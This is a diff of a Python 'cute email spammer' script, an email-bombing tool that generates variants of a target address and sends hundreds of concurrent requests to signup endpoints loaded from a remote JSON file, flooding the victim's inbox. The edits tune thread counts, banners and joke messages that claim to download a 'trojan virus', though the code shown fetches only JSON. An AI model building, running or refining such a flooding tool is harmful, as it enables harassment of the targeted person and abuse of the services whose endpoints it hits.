@@ -2,10 +2,10 @@ import asyncio, aiohttp, time, re, random, string, itertools, os, json
 from urllib.parse import urlencode
 
 # CONFIG ^_^
-size = 300 # threads per iteration
-cap = 500  # thread limit / set to None for unlimited (i do NOT recommend higher than 1000)
+size = 500 # threads per iteration
+cap = 200  # thread limit / set to None for unlimited (i do NOT recommend higher than 1000)
 
-# skidded from chatgpt lololol!!
+# skidded from chatgpt
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
@@ -31,7 +31,7 @@ def generate_email_variants(email):
     return results
 
 
-# skidded from a weird guy named chelpus 
+# skidded from a weird guy 
 def generate_username(length: int = 5):
     min_lc = ord('a')
     len_lc = 26
@@ -47,6 +47,7 @@ def validate_email(email):
 
 
 # skidded from "Laurence Gonsalves" on stackoverflow
+# i think they deleted their account :(
 def clamp(value, min_value, max_value):
     return max(min_value, min(value, max_value))
 
@@ -122,30 +123,28 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None
     update_progress()
 
 async def main():
+    print("""
+    ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
+    ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
+    ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒███      ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
+    ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
+    ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
+    ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
+    ░  ▒   ░░▒░ ░ ░     ░     ░ ░  ░    ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
+    ░         ░░░ ░ ░   ░         ░         ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
+    ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
+    ░                                                                                                                                                 
+        """)
     async with aiohttp.ClientSession() as session:
         try:
             with open("functions.json", "r") as file:
                 functions = json.load(file)
-            with open("functions.json", "w") as file:
-                json.dump(functions, file, indent=2)
         except Exception:
-            print("error no data found downloading")
+            print("⚠️ error ⚠️⚠️error no data found!!")
+            print("downloading t̷r̵o̷j̶a̴n̷ ̴v̶i̴r̴u̶s̷ ̴ to compensate for loss")
             async with session.get("https://raw.githubusercontent.com/Inkthirsty/cute-email-spammer/main/functions.json") as resp:
                 functions = await resp.json()
-                print("beep boop data downloaded TEMPORARILY")
-        # https://patorjk.com/software/taag/#p=display&h=1&v=1&f=Bloody&t=CUTE%20EMAIL%20SPAMMER
-        print("""
-        ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
-        ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
-        ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒███      ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
-        ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
-        ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
-        ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
-        ░  ▒   ░░▒░ ░ ░     ░     ░ ░  ░    ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
-        ░         ░░░ ░ ░   ░         ░         ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
-        ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
-        ░                                                                                                                                                 
-        """)
+                print("beep boop successfully downloaded your t̸̨̀ṛ̴̣̎͝o̴̲̒̓j̴̛̟̺̍a̶̛̟n̵͚̫̕ ̵̞̍̌v̶̗͔͆͠i̷͉̘͐r̴̛̬u̷͍̽͋s̸̓͜ ̶̝̠̈́͊ ")
         global progress, total, password, threads
         password = ""
         samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
@@ -180,9 +179,9 @@ async def main():
         global debug
         debug = threads == 1
         info = {
-            "THREADS": threads,
             "EMAIL": email,
             "PASSWORD": password,
+            "THREADS": threads,
             "DEBUG MODE": debug,
         }
         print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
@@ -193,7 +192,7 @@ async def main():
                 total = 1
                 functions = dict([next(reversed(functions.items()))])
         else:
-            print("testing endpoints to grant you a few extra minutes of your life...")
+            print("pretesting endpoints to grant 2 minutes of life ♥ ♥ ♡")
             test_tasks = [asyncio.create_task(fetch(session, email, values, name)) for name, values in functions.items()]
             total = len(test_tasks)
             for j in range(0, len(test_tasks), size):
@@ -210,16 +209,17 @@ async def main():
         print("🧵 initializing threads...")
         start = time.time()
         tasks = [asyncio.create_task(fetch(session, sub, values, name)) for sub in variants for name, values in functions.items()]
-        print("sending some cute emails :3")
+        print("sending some cute emails to your friends")
         for j in range(0, len(tasks), size):
             try: await asyncio.gather(*tasks[j:j+size])
             except Exception: pass
             await asyncio.sleep(1)
-        if debug:
-            with open("results.txt", "w", encoding="utf-8") as file:
-                file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
-        print(f"🤣 attempted to send {total:,} emails in {round(time.time() - start, 3):.3f} seconds")
-        print("keep in mind that some emails can be delayed or never arrive")
+        with open("results.txt", "w", encoding="utf-8") as file:
+            file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
+        taken = time.time() - start
+        minutes, seconds = int(taken // 60), int(taken % 60)
+        print(f"🤣 attempted to send {total:,} emails in {minutes}:{seconds:02} seconds")
+        print("remember that some emails will be delayed or never arrive")
         async with session.get("https://raw.githack.com/Inkthirsty/cute-email-spammer/main/adjectives.json") as resp:
             words = ", ".join(random.sample(await resp.json(), k=5))
         prefix = "an" if words[0] in "aeiou" else "a"
